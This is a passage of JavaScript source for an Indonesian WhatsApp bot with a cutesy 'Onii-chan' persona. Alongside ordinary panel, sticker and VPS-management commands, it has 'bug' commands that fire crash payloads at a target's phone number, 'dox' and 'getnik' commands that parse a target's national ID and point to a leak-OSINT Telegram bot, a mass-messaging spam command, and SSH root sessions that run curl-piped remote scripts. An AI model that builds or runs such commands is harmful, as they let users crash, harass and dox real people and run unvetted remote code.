    if (ceknye2.length == 0) return reply(`Onii-chan, masukkan nomor yang valid dan terdaftar di WhatsApp!!! 💔`);

    ownerNumber.push(bnnd);
    fs.writeFileSync('./all/database/owner2.json', JSON.stringify(ownerNumber));
    reply(`Yay! Nomor ${bnnd} telah menjadi owner, Onii-chan! 🎉✨`);
}
break;


case 'delsesi': case 'delsession': {
    if (!isOwner) return reply(`Onii-chan, hanya pemilik yang bisa menggunakan ini! 😏`);
    
    fs.readdir("./session", async function(err, files) {
        if (err) {
            console.log('Unable to scan directory: ' + err);
            return reply('Onii-chan, tidak bisa memindai direktori: ' + err);
        }

        let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
            item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
        );

        console.log(filteredArray.length);
        let teks = `Terdeteksi ${filteredArray.length} file sampah, Onii-chan!\n\n`;
        
        if (filteredArray.length == 0) return reply(teks + "Tidak ada file sampah yang ditemukan! 🌟");

        filteredArray.map(function(e, i) {
            teks += (i + 1) + `. ${e}\n`;
        });

        reply(teks);
        await sleep(2000);
        reply("Menghapus file sampah... 🌪️");
        
        await filteredArray.forEach(function(file) {
            fs.unlinkSync(`./session/${file}`);
        });

        await sleep(2000);
        reply("Yay! Berhasil menghapus semua sampah di folder session, Onii-chan! 🎉✨");
    });
}
break;
            
            
case "delowner2": {
    if (!isOwner) return reply(`Onii-chan, hanya pemilik yang bisa menggunakan ini! 😏`);
    if (!args[0]) return reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 6285727035336~`);

    ya = q.split("|")[0].replace(/[^0-9]/g, '');
    unp = ownerNumber.indexOf(ya);
    
    if (unp === -1) return reply(`Onii-chan, nomor ${ya} tidak ditemukan dalam daftar owner! 😢`);

    ownerNumber.splice(unp, 1);
    fs.writeFileSync('./all/database/owner2.json', JSON.stringify(ownerNumber));
    reply(`Yay! Nomor ${ya} telah dihapus dari daftar owner, Onii-chan! 🎉✨`);
}
break;


case "delowner": {
    if (!isOwner) return reply(`Onii-chan, hanya pemilik yang bisa menggunakan ini! 😏`);
    if (!args[0]) return reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 6285727035336~`);

    ya = q.split("|")[0].replace(/[^0-9]/g, '');
    unp = ownerNumber.indexOf(ya);
    
    if (unp === -1) return reply(`Onii-chan, nomor ${ya} tidak ditemukan dalam daftar owner! 😢`);

    ownerNumber.splice(unp, 1);
    fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber));
    reply(`Yay! Nomor ${ya} telah dihapus dari daftar owner, Onii-chan! 🎉✨`);
}
break;


case "addprem": {
    if (!isOwner) return reply(`Onii-chan, hanya pemilik yang bisa menggunakan ini! 😏`);
    if (!args[0]) return reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 6285727035336~`);

    prrkek = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`;
    let ceknya = await tamzz.onWhatsApp(prrkek);
    
    if (ceknya.length == 0) return reply(`Onii-chan, masukkan nomor yang valid dan terdaftar di WhatsApp!!! 💔`);

    prem.push(prrkek);
    fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem));
    reply(`Yay! Nomor ${prrkek} telah menjadi premium, Onii-chan! 🎉✨`);
}
break;


case "addprem2": {
    if (!isOwner) return reply(`Onii-chan, hanya pemilik yang bisa menggunakan ini! 😏`);
    if (!args[0]) return reply(`Penggunaan ${prefix + command} nomor\nContoh ${prefix + command} 6285727035336~`);

    prrkek = q.split("|")[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`;
    let ceknya = await tamzz.onWhatsApp(prrkek);
    
    if (ceknya.length == 0) return reply(`Onii-chan, masukkan nomor yang valid dan terdaftar di WhatsApp!!! 💔`);

    prem.push(prrkek);
    fs.writeFileSync("./all/database/premium2.json", JSON.stringify(prem));
    reply(`Yay! Nomor ${prrkek} telah menjadi premium, Onii-chan! 🎉✨`);
}
break;


case  'qc':{
let teks = m.quoted && m.quoted.q ? m.quoted.text : q ? q : "";
if (!teks) return m.reply(`Cara Penggunaan ${prefix}qc teks`)
const text = `${teks}`
const username = await tamzz.getName(m.quoted ? m.quoted.sender : m.sender)
const avatar = await tamzz.profilePictureUrl( m.quoted ? m.quoted.sender : m.sender,"image").catch(() =>`https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png`)

const json = {
type: "quote",
format: "png",
backgroundColor: "#FFFFFF",
width: 700,
height: 580,
scale: 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": username,
"photo": {
"url": avatar
}
},
"text": text,
"replyMessage": {}
}
 ],
};
axios
.post(
"https://bot.lyo.su/quote/generate",
json,
{
headers: { "Content-Type": "application/json" },
})
.then(async (res) => {
const buffer = Buffer.from(res.data.result.image, "base64");
let encmedia = await tamzz.sendImageAsSticker(m.chat, buffer, m, { packname: global.packname, 
author: global.author, 
categories: ['🤩', '🎉'],
id: '12345',
quality: 100,
background: 'transparent'})
await fs.unlinkSync(encmedia)
})
}
break


case 'deldroplet': case 'deldrop': {
    if (!isOwner) return ("Apalah, Onii-chan 😏")
    let dropletId = args[0];
    if (!dropletId) return reply('ID droplet belum diberikan, Onii-chan!~');

    let deleteDroplet = async () => {
        try {
            let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'DELETE',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${apido}`
                }
            });

            if (response.ok) {
                reply('Yay! Droplet berhasil dihapus, Onii-chan! 🎉');
            } else {
                const errorData = await response.json();
                return new Error(`Gagal menghapus droplet: ${errorData.message}`);
            }
        } catch (error) {
            console.error('Terjadi kesalahan saat menghapus droplet:', error);
            reply('Terjadi kesalahan saat menghapus droplet, Onii-chan~');
        }
    };

    deleteDroplet();
}
break;


case 'cekdroplet': case 'cekdrop': {
    if (!isOwner) return ("Apalah, Onii-chan 😏")
    let dropletId = args[0];
    if (!dropletId) return reply('ID droplet belum diberikan, Onii-chan!~');

    const getDropletInfo = async (dropletId) => {
        try {
            const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
            const response = await fetch(apiUrl, {
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${apido}`
                }
            });
            if (response.ok) {
                const data = await response.json();
                const droplet = data.droplet;
                const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
                const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
                const vpsRam = droplet.memory / 1024;
                return {
                    dropletid: droplet.id,
                    username: droplet.name,
                    ip: ipAddress,
                    ram: `${vpsRam} GB`,
                    os: droplet.image.distribution,
                    cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
                    storage: droplet.disk,
                    status: droplet.status // Menambahkan status VPS
                };
            } else {
                const errorData = await response.json();
                return new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
            }
        } catch (err) {
            reply('Terjadi kesalahan saat memeriksa detail droplet: ' + err.message);
            return new Error('Terjadi kesalahan saat memeriksa detail droplet.');
        }
    };

    getDropletInfo(dropletId)
        .then((info) => {
            let textku = `*DETAIL VPS KAMU, Onii-chan~*
Droplet ID: ${info.dropletid}
Hostname: ${info.username}
IPv4: ${info.ip}
Ram: ${info.ram}
OS: ${info.os}
CPU: ${info.cpu}
Storage: ${info.storage}
Status: ${info.status}`;
            tamzz.sendMessage(m.chat, { text: textku });
        })
        .catch((err) => {
            reply(err);
            tamzz.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS, Onii-chan~' });
        })
}
break;


case 'nikparser': case 'dox':
if (!isOwner) return (mess.only.owner)
if (!text) return reply(`</> Onii-chan, kamu harus mendapatkan nik target terlebih dahulu, hihihi! Lakukan command seperti ini: ${prefix + command} 16070xxxxx\n\n`)
const { nikParser } = require('nik-parser')
const ktp = text
const nik = nikParser(ktp)
m.reply(`Onii-chan, ini hasilnya:\nNik: ${nik.isValid()}\nProvinsi ID: ${nik.provinceId()}\nNama Provinsi: ${nik.province()}\nKabupaten ID: ${nik.kabupatenKotaId()}\nNama Kabupaten: ${nik.kabupatenKota()}\nKecamatan ID: ${nik.kecamatanId()}\nNama Kecamatan: ${nik.kecamatan()}\nKode Pos: ${nik.kodepos()}\nJenis Kelamin: ${nik.kelamin()}\nTanggal Lahir: ${nik.lahir()}\nUniqcode: ${nik.uniqcode()}\nSemoga membantu, Onii-chan~!`)
break
case 'listprem': {
    if (!isOwner) return m.reply(mess.only.owner)
    let listprem = `Onii-chan, ini adalah List Reseller Panel Public MikkuBot~\n\nTotal Seller: ${seller.length}\n`
    var no = 1
    for (let x of seller) {
        listprem += `\nUser: ${no++}\nID: ${x}\n\n`
    }
    listprem += `Untuk Menghapus Akses Prem, ketik ${prefix}delprem 628xxx/@tag~ Ganbatte ne, Onii-chan!`
    tamzz.sendMessage(m.chat, { text: listprem }, { quoted: kalgans })
}
break
case 'listprem2': {
    if (!isOwner) return m.reply(mess.only.owner)
    let listprem = `Onii-chan, ini adalah List Reseller Panel Private MikkuBot~\n\nTotal Seller: ${seller2.length}\n`
    var no = 1
    for (let x of seller2) {  // Pastikan menggunakan seller2 di sini
        listprem += `\nUser: ${no++}\nID: ${x}\n\n`
    }
    listprem += `Untuk Menghapus Akses Prem, ketik ${prefix}delprem 628xxx/@tag~ Ganbatte ne, Onii-chan!`
    tamzz.sendMessage(m.chat, { text: listprem }, { quoted: kalgans })
}
break
case "pushkontak3":
if (!isOwner) return reply(`ϝαԃȥʋρɳ Aja`)
if (!isGroup) return m.reply(`di group coy`)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} jeda|teks`)
await reply("_Tᴜɴɢɢᴜ ᴏɴɪɪ-ᴄʜᴀɴ, ʟᴀɢɪ ᴘʀᴏsᴇs!! ✨_")
        const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await tamzz.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await tamzz.sendMessage(men, { image: { url: mem }, caption: global.tekspushkon })
await sleep(text.split("|")[0])
} else {
await tamzz.sendMessage(men, { text: global.tekspushkonv4 })
await sleep(text.split("|")[0])
}
}
reply("Yay! Sᴜᴄᴄᴇs, Onii-ᴄʜᴀɴ! ✨")
break
case "delprem2":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285727035336`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem2.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./all/database/premium2.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break
case "self":{
if (!isOwner) return reply('Dame yo, Onii-chan! ✧');

tamzz.public = false;
reply('*Yay! Berhasil berubah jadi Self, Onii-chan !✧*');
}
break;
case "public": {
if (!isOwner) return reply('Dame yo, Onii-chan! ✧');

tamzz.public = true;
reply('*Yay! Berhasil berubah jadi Public, Onii-chan! ✧*');
}
break
case "domainmenu": {
const tamz = `Hai Onii Chan, Berikut List Domain Yg Tersedia Di MikkuBot

┏╍╍╍┉╍☉ \`DOMAIN MENU\`
┋░▹  ${prefix}d1 kedai-panel.my.id
┋░▹  ${prefix}d2 mypanell.biz.id
┋░▹  ${prefix}d3 piwzstoreee.my.id
┋░▹  ${prefix}d4 piwzpediaaa.biz.id
┋░▹  ${prefix}d5 piwzpanel.me
┋░▹  ${prefix}d6 r0ulxye4.my.id
┋░▹  ${prefix}d7 lanzpanel.my.id
┋░▹  ${prefix}d8 cpanel-vip.my.id (khusus cpanel)
┋░▹  ${prefix}d9 kukurahost.my.id
┋░▹  ${prefix}d10 panellstore.net
┋░▹  ${prefix}d11 panelprivv.xyz
┋░▹  ${prefix}d12 tokopanellku.my.id
┋░▹  ${prefix}d13 kiospanell.my.id
┋░▹  ${prefix}d14 moon-offc.my.id
┋░▹  ${prefix}d15 moon-ooffc.biz.id
┋░▹  ${prefix}d16 dvdz-xdz.me
┋░▹  ${prefix}d17 tokopanellmurah.my.id
┋░▹  ${prefix}d18 bisnispanel.my.id
┋░▹  ${prefix}d19 dvdz-official.tech
┋░▹  ${prefix}d20 tokopanel.biz.id
┋░▹  ${prefix}d21 store-panel.biz.id
┋░▹  ${prefix}d22 sellerpanel.biz.id
┋░▹  ${prefix}d23 panellprivate.my.id
┋░▹  ${prefix}d24 mypanel.my.id
┋░▹  ${prefix}d25 kangpanel.biz.id
┋░▹  ${prefix}d26 jasapanel.my.id
┋░▹  ${prefix}d27 dewapanel.my.id
┋░▹  ${prefix}d28 adminpanel.biz.id
┋░▹  ${prefix}d29 plerkuda.my.id
┋░▹  ${prefix}d30 cafegt.my.id
┋░▹  ${prefix}d31 dmdpanel.my.id
┋░▹  ${prefix}d32 storemurah.my.id
┋░▹  ${prefix}d33 shopwebsite.my.id
┋░▹  ${prefix}d34 market-software.my.id
┋░▹  ${prefix}d35 panel-digital.my.id
┋░▹  ${prefix}d36 acrp.my.id
┋░▹  ${prefix}d37 caca-store.biz.id
┋░▹  ${prefix}d38 rhizhosting.my.id
┋░▹  ${prefix}d39 spasanddella.my.id
┋░▹  ${prefix}d40 zerowant.my.id
┋░▹  ${prefix}d41 sellerpanel-vvip.my.id
┋░▹  ${prefix}d42 ekiofficial.my.id
┋░▹  ${prefix}d43 ekioffcial.biz.id
┋░▹  ${prefix}d44 nw-terbaru-whs.biz.id
┋░▹  ${prefix}d45 panelku-jasteb.my.id
┋░▹  ${prefix}d46 tokodigitalonline.my.id
┋░▹  ${prefix}d47 pannel-pvrt.my.id
┋░▹  ${prefix}d48 sellerpanell.my.id
┋░▹  ${prefix}d49 pannelkuu.biz.id
┋░▹  ${prefix}d50 miha.my.id
┋░▹  ${prefix}d51 server-smtp1.my.id
┋░▹  ${prefix}d52 my-website.my.id
┋░▹  ${prefix}d53 smtp1.my.id
┋░▹  ${prefix}dv2 mefahri.biz.id
┋░▹  ${prefix}dv1 mefahri.biz.id
┋░▹  ${prefix}d56 didindev.my.id
┋░▹  ${prefix}d57 panelstore.xyz
┋░▹  ${prefix}d58 yasshost.com
┋░▹  ${prefix}d59 diimz.site
┋░▹  ${prefix}d60 didinsec.biz.id
┋░▹  ${prefix}d61 ruztanxd.my.id
┋░▹  ${prefix}d62 digitalserver.biz.id
┋░▹  ${prefix}d63 mypanell.biz.id
┋░▹  ${prefix}d64 tokopanellku.my.id
┋░▹  ${prefix}d65 panellstore.net
┋░▹  ${prefix}d66 celiaofficial.my.id
┋░▹  ${prefix}d67 celiastore.my.id
┋░▹  ${prefix}d68 panellofficial.site
┋░▹  ${prefix}d69 panellofficial.my.id
┋░▹  ${prefix}d70 celiapanellstore.my.id
┋░▹  ${prefix}d71 kayy.me
┋░▹  ${prefix}d72 kayyoffc.tech
┋░▹  ${prefix}d73 kayypedia.com
┋░▹  ${prefix}d74 panellstoree.com
┋░▹  ${prefix}d75 panell.icu
┋░▹  ${prefix}d76 xmartpanel.my.id
┋░▹  ${prefix}d77 vinnzofficial.biz.id
┋░▹  ${prefix}d78 vinzzxofficial.xyz
┋░▹  ${prefix}d79 moon-offc.biz.id
┋░▹  ${prefix}d80 moon-offc.my.id
┋░▹  ${prefix}d81 bekzsukacoli.biz.id
┋░▹  ${prefix}d82 bekzpeler.my.id
┋░▹  ${prefix}d83 panellstore.site
┋░▹  ${prefix}d84 panel-market.biz.id
┋░▹  ${prefix}d85 mikkupanel.my.id ( _Domain khusus ϝαԃȥʋρɳ_ )
┋░▹  ${prefix}d86 onlinehostt.biz.id ( _Domain khusus ϝαԃȥʋρɳ_ )
┋░▹  ${prefix}d87 panel-mikku.xyz ( _Domain khusus ϝαԃȥʋρɳ_ )
┋░▹  ${prefix}d88 xstxyro.xyz
┋░▹  ${prefix}d89 store-panel.xyz
┗━━━━━━━━━━━━━━━━━━`
tamzz.sendMessage(m.chat, {
text: tamz,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'ϝαԃȥʋρɳ',
thumbnailUrl: 'https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg',
sourceUrl: "https://chat.whatsapp.com/IAvxLU8KWknAYJngDXOctu",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
}
break
case 'getnik':
if (!isOwner) return m.reply(`lu bukan dev cok`)
tutor = fs.readFileSync('./tamzz/tutor.mp4')
tamzz.sendMessage(m.chat, {video: tutor, caption: `Bot Telegram untuk mendapatkan nik target: https://t.me/LeakOsintOpen_bot`},{quoted: m})
break
case 'leave': {
if (!isOwner) return m.reply(`Khusus ϝαԃȥʋρɳ🤪`)
await tamzz.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
case 'saldo':{
reply(`*━━ CHECK YOUR INFO ━━*

 _• *Name:* ${cekUser("name", sender)}_
 _• *Resi:* ${cekUser("resi", sender)}_
 _• *Nomer:* ${sender.split('@')[0]}_
 _• *Saldo:* Rp${toRupiah(cekSaldo(sender, db_saldo))}_

Untuk menbahkan Saldo ketik #deposit

*Note :*
_saldo hanya bisa untuk buy panel_
_tidak bisa ditarik atau transfer_!`)
}
break
case 'sipilist': case '1hit': case 'mimir': case '1shoot': case 'tamzbug': case 'systemc1': {
if (!isOwner && !isMurbug) return reply('Maaf Perintah Ini Khusus Pengguna Murbug Kami! Join Murbug Dulu Baru Bisa Akses😈')
if (!isGroup) return tamzz('Gunakan Bug Didalam Group Murbug Owner Kami!')
if (!text) return m.reply(`Penggunaan .${command} 6287392784527`)
let bijipler = text.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply('_Tunggu Sebentar Sedang Mengirim..._')
for (let j = 0; j < 1; j++) {
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force2)
await ngeloc(target, force)
}
await m.reply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 2 minutes so that the bot is not banned.`)
}
break
case "vps": {
  if (!isOwner) return reply(mess.only.owner);
  let t = text.split(',');
if (t.length < 4) return reply(`*Format salah!*\nPenggunaan: ${prefix}vps hostname,region,osversi,ram`)

    let hostname = t[0];
    let regions = t[1];
    let ram = t[2];
    let osvps = t[3];
    
  try {
    let dropletData = {
      name: hostname,
      region: regions,
      size: ram,
      image: osvps,
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['TamzDev']
    };

    let password = generateRandomPassword()
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + apido
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`\`\`\`Tunggu Sebentar...\`\`\``);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + apido
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `*\`VPS berhasil dibuat √\`*\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n\n`;
      
      messageText += `*\`SPEKTIFIKASI\`*\n\n`;
      
      messageText += `HOSTNAME: ${hostname}\n`;
      messageText += `REGION: ${regions}\n`;
      messageText += `RAM: ${ram}\n`;
      messageText += `OS + VERSI: ${osvps}\n`;

      await tamzz.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break
case 'startwings': case 'configurewings': {
    if (!isOwner) return ("apalah 😏")
    
    let t = text.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan: ${prefix}startwings ipvps,password,token (token configuration)`)
    
    let ipvps = t[0];
    let passwd = t[1];
    let token = t[2];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/gitfdil1248/thema/main/install.sh)'
    const conn = new Client();
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        reply('𝗣𝗥𝗢𝗦𝗘𝗦 𝗖𝗢𝗡𝗙𝗜𝗚𝗨𝗥𝗘 𝗪𝗜𝗡𝗚𝗦')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
reply('𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗧𝗔𝗥𝗧 𝗪𝗜𝗡𝗚𝗦 𝗦𝗜𝗟𝗔𝗛𝗞𝗔𝗡 𝗖𝗘𝗞 𝗡𝗢𝗗𝗘 𝗔𝗡𝗗𝗔😁');
                conn.end();
            }).on('data', (data) => {
            stream.write('kenapasepuh\n');
                stream.write('3\n');
                stream.write(`${token}\n`)
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   }

break
case 'uninstallthema': {
    if (!isOwner) return ("apalah 😏")
    
    let t = text.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan: ${cmd} ipvps,password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/gitfdil1248/thema/main/install.sh)'
    const conn = new Client();
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        reply('*PROSES HAPUS THEMA*')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
reply('SUCCES COPOT THEMA, SILAHKAN DI CHECK');
                conn.end();
            }).on('data', (data) => {
            stream.write('kenapasepuh\n');
                stream.write('2\n');
                stream.write('y\n')
                stream.write('yes\n')
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   }

break
case 'demoteall':
if (!isOwner) return reply('*ᴡᴀᴅᴜʜ ᴋᴀᴋ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ ʜᴇʜᴇ !*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
await reply("DONE✅")
var groupe = await tamzz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
tamzz.groupParticipantsUpdate(from, mems, 'demote')
break
case 'pinterest': case 'pin': {
  if (!text) return reply(`Example : Rumah Minecraft`);
  //try {
  await m.reply("Proses Mohon Tunggu Sebentar");

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: tamzz.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 10); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: `${namaCreator}`
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }

  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Berikut Hasil Pencarian Anda`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: `Pencarian Dari ${text}`
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await tamzz.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
  
}
break
case 'installpanel': {
    if (!isOwner) return ("apalah 😏")
    let t = text.split(',');
    if (t.length < 5) return reply(`*Format salah!*\nPenggunaan: ${prefix}installpanel ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        reply('*PROSES PENGINSTALLAN PANEL SEDANG BERLANGSUNG MOHON TUNGGU 5-10MENIT*');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        reply('*PROSES PENGINSTALLAN WINGS SEDANG BERLANGSUNG MOHON TUNGGU 5-10MENIT*');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = 'bash <(curl https://raw.githubusercontent.com/vallzprivate/theme/main/install.sh)';
        reply('*MEMULAI CREATE NODE & LOCATION*');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
        m.reply(`*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
